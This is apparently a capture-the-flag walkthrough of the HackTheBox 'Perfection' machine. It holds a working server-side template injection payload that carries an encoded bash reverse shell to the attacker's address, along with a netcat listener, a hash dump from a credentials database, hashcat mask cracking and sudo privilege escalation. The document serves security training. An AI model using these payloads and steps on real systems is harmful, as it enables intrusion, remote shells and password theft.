# 🦸 Perfection HackTheBox Walkthrough!!

<figure><img src=".gitbook/assets/1 _nlKfQW16KC1ieR3EL8vwA.png" alt=""><figcaption></figcaption></figure>

Add IP into the host file

```
nano /etc/hosts
```

<figure><img src=".gitbook/assets/Screenshot 2024-03-09 at 16-28-25 Weighted Grade Calculator.png" alt=""><figcaption><p><a href="http://10.10.11.253/">http://perfection.htb/</a></p></figcaption></figure>

**NMAP RESULT**

```
┌──(Batman㉿GC)-[~]
└─$ nmap -A 10.10.11.253 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-09 16:26 IST
Nmap scan report for perfection.htb (10.10.11.253)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.17 seconds
```

**GAINING ACCESS**

* Generate Payload

Using hURL command to encode and decode payloads showcases the manipulation of data to exploit web application vulnerabilities. The payload crafted for the Weighted Grade Calculator application is designed to execute a reverse shell command, taking advantage of any potential server-side code execution vulnerabilities.

```
┌──(Batman㉿GC)-[~]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.14.69/1337 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.14.69/1337 0>&1                                                                  
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OS8xMzM3IDA+JjE=
```

```
┌──(Batman㉿GC)-[~]
└─$  hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OS8xMzM3IDA+JjE="

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42OS8xMzM3IDA+JjE=                                                      
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42OS8xMzM3IDA%2BJjE%3D
```

We have to inject URL-encoded payload to the POST request of "Calculate your weighted grade".

<figure><img src=".gitbook/assets/Screenshot 2024-03-09 at 5.26.37 PM.png" alt=""><figcaption></figcaption></figure>

`grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1`**`=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC42OS8xMzM3IDA%2BJjE%3D |+base64+-d+|+bash");%25>1`**

Also, enable a Netcat listener in the terminal to get a reverse shell connection.

```
┌──(Batman㉿GC)-[~]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.69] from (UNKNOWN) [10.10.11.253] 57316
bash: cannot set terminal process group (984): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ ls
ls
main.rb
public
views
susan@perfection:~/ruby_app$ cd /home
cd /home
susan@perfection:/home$ ls
ls
susan
susan@perfection:/home$ cd susan
cd susan
susan@perfection:~$ ls
ls
Migration
ruby_app
user.txt
susan@perfection:~$ cat user.txt
cat user.txt
2de7aca06461cfe--------
susan@perfection:~$ 
```

On further enumerations, we can find hashes of other users

```
susan@perfection:~$ cd Migration
cd Migration
susan@perfection:~/Migration$ ls
ls
pupilpath_credentials.db
susan@perfection:~/Migration$ strings pupilpath_credentials.db
strings pupilpath_credentials.db
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518------------------------
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76-------------------------
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee4-------------------------
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f-------------------------
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d6-------------------------
```

Now copy all the hashes we found.

**CRACK THE HASH \[HASHCAT]**

Using Hashcat crack the password of Susan.

```
┌──(Batman㉿GC)-[~]
└─$ hashcat -m 1400 hash.txt  -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
<HASH OF SUSAN> :susan_nasus_413XXXXXXX
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Sat Mar  9 17:38:59 2024 (1 min, 50 secs)
Time.Estimated...: Sat Mar  9 17:40:49 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2310.9 kH/s (0.47ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324559872/1000000000 (32.46%)
Rejected.........: 0/324559872 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_296471462

Started: Sat Mar  9 17:38:56 2024
Stopped: Sat Mar  9 17:40:50 2024
```

Now use the password to log in with user Susan.

```
┌──(Batman㉿GC)-[~]
└─$ ssh susan@10.10.11.253
susan@10.10.11.253's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Mar  9 12:13:27 PM UTC 2024

  System load:           0.1611328125
  Usage of /:            51.0% of 5.80GB
  Memory usage:          6%
  Swap usage:            0%
  Processes:             246
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.253
  IPv6 address for eth0: dead:beef::250:56ff:feb9:d2ee


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

4 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
susan@perfection:~$
```

&#x20;**PRIVILEGE ESCALATION**

```
susan@perfection:~$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
```

Here user Susan has permission to log in with the root

```
susan@perfection:~$ sudo su
root@perfection:/home/susan# cd /root
root@perfection:~# cat root.txt
eb33392e900c84405d------------
root@perfection:~#
```

Hurray!! Got the root access.

<figure><img src=".gitbook/assets/bmc-full-logo-no-background.png" alt="" width="375"><figcaption><p>https://www.buymeacoffee.com/b4tm4n</p></figcaption></figure>
